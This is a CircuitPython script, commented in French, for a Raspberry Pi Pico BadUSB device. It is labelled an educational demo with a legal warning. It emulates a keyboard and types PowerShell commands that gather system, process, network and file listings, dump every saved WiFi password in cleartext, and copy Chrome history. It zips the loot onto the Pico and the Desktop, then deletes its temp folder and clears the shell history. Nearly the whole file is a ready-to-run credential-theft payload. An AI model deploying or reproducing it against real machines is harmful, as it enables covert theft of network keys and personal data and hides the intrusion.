"""
Raspberry Pi Pico - BadUSB Demo 1: Exfiltration Basique
========================================================

AVERTISSEMENT LÉGAL:
Ce script est fourni à des fins éducatives et de sensibilisation uniquement.
L'utilisation sans autorisation est ILLÉGALE (Article 323-1 du Code pénal).

Description:
Collecte d'informations système et exfiltration sur le Pico
Compatible clavier AZERTY français

Durée: ~15 secondes
Impact: MOYEN - Collecte d'informations

Ce script démontre:
- Collecte d'informations système
- Exfiltration de données vers le Pico
- Vol de mots de passe WiFi
- Vol d'historique de navigation

Données collectées:
- Informations système complètes
- Liste des processus en cours
- Configuration réseau
- Arborescence Documents/Desktop
- Mots de passe WiFi en clair
- Historique Chrome

Exfiltration:
- CIRCUITPY/exfil/data_YYYYMMDD_HHMMSS.zip
- Desktop/EXFILTRATED_DATA.zip
"""

# ============================================================================
# IMPORTS
# ============================================================================
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_fr import KeyboardLayout
from keycode_win_fr import Keycode

# ============================================================================
# INITIALISATION
# ============================================================================
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

# ============================================================================
# FONCTIONS UTILITAIRES
# ============================================================================

def press_combo(*keys):
    """Appuie sur une combinaison de touches"""
    keyboard.press(*keys)
    time.sleep(0.1)
    keyboard.release_all()
    time.sleep(0.1)

def type_text(text):
    """Tape du texte avec le layout français"""
    layout.write(text)
    time.sleep(0.05)

def press_enter():
    """Appuie sur Entrée"""
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

# ============================================================================
# SCRIPT PRINCIPAL
# ============================================================================

# Attendre la reconnaissance du périphérique
time.sleep(2)

# Étape 1: Ouvrir PowerShell
press_combo(Keycode.WINDOWS, Keycode.R)
time.sleep(0.8)
type_text("powershell")
press_enter()
time.sleep(2)

# Étape 2: Commandes d'exfiltration
commands = [
    # Créer un dossier temporaire avec nom aléatoire
    "$temp=$env:TEMP+'\\data_'+[guid]::NewGuid().ToString().Substring(0,8);",
    "mkdir $temp | Out-Null;",
    
    # Collecter les informations système
    "Get-ComputerInfo | Out-File $temp\\system.txt;",
    "Get-Process | Out-File $temp\\processes.txt;",
    "Get-NetIPAddress | Out-File $temp\\network.txt;",
    
    # Lister les fichiers utilisateur
    "tree $env:USERPROFILE\\Documents /F | Out-File $temp\\documents.txt;",
    "tree $env:USERPROFILE\\Desktop /F | Out-File $temp\\desktop.txt;",
    
    # Extraire les mots de passe WiFi (CRITIQUE)
    "(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Out-File $temp\\wifi.txt;",
    
    # Copier l'historique Chrome
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History' $temp\\chrome_history.db};",
    
    # Détecter le Pico (CIRCUITPY ou RPI-RP2)
    "$usb=(gwmi win32_volume|?{$_.Label -eq 'CIRCUITPY' -or $_.Label -eq 'RPI-RP2'}).DriveLetter;",
    'if($usb){if(!(Test-Path "$usb\\exfil")){mkdir "$usb\\exfil" | Out-Null}};',
    
    # Exfiltrer vers le Pico
    'if($usb){Compress-Archive -Path $temp -DestinationPath "$usb\\exfil\\data_$(Get-Date -Format "yyyyMMdd_HHmmss").zip" -EA SilentlyContinue};',
    
    # Copie de backup sur le bureau (pour démo)
    "Compress-Archive -Path $temp -DestinationPath $env:USERPROFILE\\Desktop\\EXFILTRATED_DATA.zip;",
    
    # Nettoyage des traces
    "Remove-Item -Recurse -Force $temp;",
    "Clear-History;",
    "exit"
]

# Étape 3: Exécuter les commandes
for cmd in commands:
    type_text(cmd)
    press_enter()
    time.sleep(0.2)  # Délai entre chaque commande
